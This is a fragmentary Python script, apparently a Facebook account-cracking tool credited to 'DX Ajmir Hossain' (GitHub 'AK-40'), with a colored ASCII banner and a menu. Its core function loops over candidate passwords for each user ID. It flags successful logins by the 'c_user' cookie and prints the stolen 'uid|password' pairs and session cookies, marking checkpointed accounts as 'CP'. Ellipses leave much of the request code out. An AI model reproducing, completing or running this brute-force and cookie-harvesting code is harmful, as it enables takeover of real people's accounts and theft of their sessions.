...
logo= """
\033[1;32m  ______      _____  __       __  ______  _______  
\033[1;32m /      \    |     \|  \     /  \|      \|       \ 
\033[1;32m|  $$$$$$\    \$$$$$| $$\   /  $$ \$$$$$$| $$$$$$$\
\033[1;32m| $$__| $$      | $$| $$$\ /  $$$  | $$  | $$__| $$
\033[1;32m| $$    $$ __   | $$| $$$$\  $$$$  | $$  | $$    $$
...
\033[1;32m \$$   \$$  \$$$$$$  \$$      \$$ \$$$$$$ \$$   \$$
\033[1;32m═════════════════════════════════════════
\033[1;32m <> FACEBOOK  : DX Ajmir Hossain
\033[1;32m <> GITHUB    : AK-40 
...
class Main:
    def __init__(self):
        ...
        print('\033[1;31m--------------------------------------------------------')
        Ajmir=input("\033[1;37m[\033[1;32m~\033[1;37m] CHOOSE : ")
        if Ajmir in ["1", "01"]:
            v2()
        else:
            exit()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%s<>DX-Ajmir<>\033[1;31m]\033[1;34m<>\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m<>\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[DX-Ajmir-OK💚] {uid}|{ps}\n\033[1;32m[COOKIE🎁] \033[1;31m{coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[DX-CP💔] {uid}|{ps}")
